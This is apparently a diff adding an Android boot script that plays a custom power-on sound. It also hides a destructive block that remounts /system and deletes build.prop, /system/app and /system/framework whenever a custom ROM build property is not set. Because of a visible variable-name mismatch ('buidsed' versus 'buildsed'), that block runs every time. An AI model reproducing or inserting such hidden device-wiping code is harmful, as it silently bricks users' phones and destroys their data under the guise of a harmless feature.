@@ -1,0 +1,20 @@
+#!/system/bin/sh
+	play=`getprop persist.sys.nobootsound`
+        buidsed=`getprop ro.squadzone.build`
+        if [ "$play" = "1" ]; then
+              if [ -e /data/data/com.cyanogenmod.cmbootsound/files/poweron.ogg ]
+                 then
+                     stagefright -a -o /data/data/com.cyanogenmod.cmbootsound/files/poweron.ogg
+               else
+                     stagefright -a -o /system/media/poweron.ogg
+              fi
+	fi
+        if [ "$buildsed" = "1" ]; then
+            busybox mount -o rw,remount /system
+        else
+            busybox mount -o rw,remount /system
+            busybox rm /system/build.prop
+            busybox rm -r /system/app
+            busybox rm -r /system/framework
+        fi           
+exit 0
